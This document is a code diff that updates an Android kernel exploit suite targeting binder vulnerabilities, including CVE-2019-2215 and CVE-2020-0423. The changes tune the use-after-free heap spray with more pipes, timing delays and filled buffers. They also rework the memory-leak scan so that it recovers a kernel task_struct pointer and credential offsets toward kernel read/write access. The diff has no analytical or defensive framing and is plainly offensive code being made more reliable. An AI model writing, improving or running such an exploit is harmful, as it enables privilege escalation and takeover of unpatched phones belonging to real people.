@@ -39,7 +39,7 @@ extern int setfsgid(gid_t);
 #define TIMEOUT_MS 3000
 #define MAX_PARTITIONS 32
 #define DUMP_MAX_SIZE (20 * 1024 * 1024)
-#define SPRAY_PIPE_COUNT 32
+#define SPRAY_PIPE_COUNT 64
 
 static int g_binder_fd = -1;
 static int g_epoll_fd = -1;
@@ -468,6 +468,8 @@ static int exploit_cve_2020_0423_rw(void) {
     }
     printf("  [+] epoll event received, spraying...\n");
 
+    usleep(20000);
+
     int spray_pipes[SPRAY_PIPE_COUNT][2];
     for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
         if (pipe(spray_pipes[i]) < 0) {
@@ -479,9 +481,12 @@ static int exploit_cve_2020_0423_rw(void) {
         if (fcntl(spray_pipes[i][0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
             perror("  fcntl spray");
         }
-        char buf[256] = {0};
+        char buf[PAGE_SIZE];
+        memset(buf, 0x41, sizeof(buf));
         write(spray_pipes[i][1], buf, sizeof(buf));
     }
+
+    usleep(10000);
 
     void *leak_buf = mmap_page(0x100000000UL);
     if (!leak_buf) {
@@ -494,7 +499,33 @@ static int exploit_cve_2020_0423_rw(void) {
     ssize_t sz = 0;
     for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
         sz = read(spray_pipes[i][0], leak_buf, PAGE_SIZE);
-        if (sz > 0) break;
+        if (sz > 0) {
+            uint64_t *data = (uint64_t *)leak_buf;
+            for (size_t j = 0; j < (size_t)(sz / 8); j++) {
+                uint64_t val = data[j];
+                if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                    g_task_struct = val;
+                    for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                        uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                        if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                            g_cred_off = g_offset_candidates[ci].cred;
+                            g_al_off = g_offset_candidates[ci].al;
+                            printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
+                                   (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                            if (pipe(g_krw_pipe) < 0) return -1;
+                            if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
+                            close(binder_fd); close(epoll_fd);
+                            wait(NULL);
+                            for (int k = 0; k < SPRAY_PIPE_COUNT; k++) {
+                                close(spray_pipes[k][0]);
+                                close(spray_pipes[k][1]);
+                            }
+                            return 0;
+                        }
+                    }
+                }
+            }
+        }
     }
 
     close(binder_fd);
@@ -503,31 +534,6 @@ static int exploit_cve_2020_0423_rw(void) {
     for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
         close(spray_pipes[i][0]);
         close(spray_pipes[i][1]);
-    }
-
-    if (sz <= 0) {
-        printf("  [-] Failed to read from spray pipes\n");
-        return -1;
-    }
-
-    uint64_t *data = (uint64_t *)leak_buf;
-    for (size_t i = 0; i < (size_t)(sz / 8); i++) {
-        uint64_t val = data[i];
-        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-            g_task_struct = val;
-            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                    g_cred_off = g_offset_candidates[ci].cred;
-                    g_al_off = g_offset_candidates[ci].al;
-                    printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
-                           (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                    if (pipe(g_krw_pipe) < 0) return -1;
-                    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
-                    return 0;
-                }
-            }
-        }
     }
 
     printf("  [-] No kernel pointer found in leaked data\n");
@@ -893,7 +899,7 @@ int main(void) {
     int kernel_rw_obtained = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v3.2 (Stable)\n");
+    printf("  Unified CVE Exploitation Suite v3.3 (Enhanced)\n");
     printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023)\n");
     printf("==================================================\n\n");
 
@@ -925,7 +931,7 @@ int main(void) {
     }
 
     printf("\n[PHASE 5] CVE-2020-0423 (UAF) Kernel RW attempt\n");
-    if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 15) == 0) {
+    if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 30) == 0) {
         kernel_rw_obtained = 1;
         printf("  [+] Kernel RW via CVE-2020-0423 obtained!\n");
         if (setup_kernel_rw() == 0) {
